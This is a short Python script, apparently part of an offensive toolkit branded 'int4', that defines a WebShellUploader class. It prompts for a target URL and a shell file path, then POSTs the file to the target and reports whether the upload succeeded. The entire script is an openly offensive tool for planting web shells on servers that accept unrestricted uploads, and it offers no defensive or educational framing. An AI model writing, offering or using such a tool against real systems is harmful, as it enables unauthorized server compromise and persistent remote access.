#!/usr/bin/env python3
import requests

class WebShellUploader:
    def __init__(self):
        self.prompt = 'int4 > '

    def run(self):
        target_url = input("int4 webshell_uploader[Enter The Target Url] >")
        shell_file = input("int4 webshell_uploader[Enter path to shell file] >")
        self.upload_shell(target_url, shell_file)

    def upload_shell(self, target_url, file_path):
        print("[*] Attempting to upload web shell...")
        try:
            with open(file_path, 'rb') as file:
                files = {'file': file}
                response = requests.post(target_url, files=files)

            if response.status_code == 200:
                print("[+] Web shell uploaded successfully!")
                print("Response:", response.text)
            else:
                print("[-] Failed to upload web shell. Status Code:", response.status_code)

        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    uploader = WebShellUploader()
    uploader.run()